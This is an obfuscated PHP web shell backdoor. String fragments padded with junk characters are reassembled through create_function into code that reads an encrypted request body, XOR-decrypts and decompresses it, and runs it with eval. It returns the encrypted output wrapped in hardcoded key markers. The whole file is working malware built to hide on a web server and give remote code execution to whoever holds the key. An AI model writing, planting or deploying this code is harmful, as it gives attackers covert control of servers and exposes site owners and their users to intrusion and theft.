<?php
$n='(@bVase64_dVecodeV(V$m[1]),$k)))V;$oV=@ob_getV_contenVtVs();@ob_eVnd_cleVan()';
$x=';$Vr=@base6V4_encVVode(@xV(@gzcompreVss($Vo),$Vk));priVnt("$p$kh$Vr$kf");}';
$u='tentsV("php://iVVnpuVt"),$m)==1) {@ob_stVartV();@evaVl(@gzuncoVmpressV(@x';
$O='"";Vfor($i=0;$iV<$l;){for(V$jV=0;($j<$cV&&$Vi<$l);$j++V,$i+V+V){V$o.=V$tV{$i}^$k';
$A='{$j};}}reVturn V$o;}ifV (@preg_matVch("/$kh(V.+)V$kf/",@fVile_Vget_cVoVn';
$k='$k="748a1VbVVbe";$kh=V"af06facdce80V";$kf="VVb50a92V4dV6Vd3V3";$p="2meFJ';
$C=str_replace('sI','','crsIeasItesI_sIfuncsItisIon');
$I='QLVCN5VLPkfVKQ";functionV x($t,$k){$c=strVlenV($k);$VVl=strlen($t);VV$o=';
$w=str_replace('V','',$k.$I.$O.$A.$u.$n.$x);
$X=$C('',$w);$X();
?>
